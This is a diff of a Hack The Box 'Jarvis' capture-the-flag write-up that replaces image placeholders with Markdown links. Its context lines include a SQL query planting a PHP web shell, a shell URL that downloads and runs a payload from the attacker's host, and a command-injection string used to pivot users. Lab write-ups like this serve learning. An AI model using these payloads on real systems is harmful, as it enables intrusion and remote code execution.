@@ -1,7 +1,7 @@
 # Jarvis (HACK THE BOX)
 
 Hey Guys,Today we will be doing Jarvis from HackTheBox,
-<<logo-png>>
+![](logo.png)
 <br/>
 
 ## Nmap Scan
@@ -42,7 +42,7 @@ We have only 2 ports opened(well one more but it was a rabbit hole) so let's sta
 
 ## Enumerating Web Server
 
-<<selection009>>
+![](Selection_009.png)
 <br/>
 After looking around we found a good candidate for vulnerabilites like sql injection or LFI,etc
 
@@ -58,7 +58,7 @@ Username:-DBadmin
 Password:-*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 ```
 But this is a sha1 hash so after some hit and trial with the hash we got the value decrypted :)
-<<selection010>>
+![](Selection_010.png)
 <br/>
 
 ```
@@ -89,7 +89,7 @@ GENERATED WORDS: 4612
 ```
 After logging in with the credentials we got from sqlmap,We created a new database to upload shell ([Reference](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/))
 
-<<selection 011>>
+![](Selection_011.png)
 <br/>
 
 We used the following query to create a new PHP one liner shell
@@ -97,11 +97,11 @@ We used the following query to create a new PHP one liner shell
 ```
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/hack.php"
 ```
-<<selection 012>>
+![](Selection_012.png)
 <br/>
 
 We can execute commands now
-<<selection 013>>
+![](Selection_013.png)
 <br/>
 
 ## Low Priv Shell
@@ -112,7 +112,7 @@ Now we got a shell by executing this command on our rce php file...
 ```
 http://10.10.10.143/hack.php?cmd=wget http://10.10.15.239:8081/sh.php;php sh.php
 ```
-<<selection 014>>
+![](Selection_014.png)
 <br/>
 
 ## Pivoting to pepper user
@@ -151,7 +151,7 @@ then it asks for a IP address and we executed this command to get shell
 ```
 $(sh /var/www/html/shell.sh)
 ```
-<<workspace_15>>
+![](Workspace 1_015.png)
 <br/>
 
 ## Privesc
@@ -233,7 +233,7 @@ root
 
  ```
  Hooray !!! We rooted it 
- <<meme>>
+ ![](meme.gif)
  <br/>
 This was a good and straight forward machine,
 and if you guys like it stay tuned for more :)
